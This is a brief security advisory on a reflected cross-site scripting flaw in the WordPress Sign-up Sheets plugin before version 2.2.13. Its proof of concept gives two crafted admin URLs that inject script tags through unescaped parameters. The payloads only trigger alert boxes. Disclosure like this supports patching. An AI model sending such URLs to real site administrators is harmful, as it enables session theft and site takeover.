## WordPress Plugin Vulnerabilities

# Sign-up Sheets < 2.2.13 - Reflected XSS

### Description

The plugin does not escape some generated URLs, as well as the $\_SERVER['REQUEST\_URI'] parameter before outputting them back in attributes, which could lead to Reflected Cross-Site Scripting.

### Proof of Concept

Make a logged in admin open the URL below (the sheet id needs to be a valid one with at least one task. Such id is disclosed in the frontend in any sign-up sheet)
https://example.com/wp-admin/edit.php?post\_type=dlssus\_sheet&page=fdsus-manage&sheet\_id=777&"><script>alert(/XSS/)</script>=1
Make a logged in admin open the below URL using web browser which does not encode characters:
https://example.com/wp-admin/edit.php?post\_type=dlssus\_sheet&page=dlssus-help&cow=b"><script>alert(921)</script>
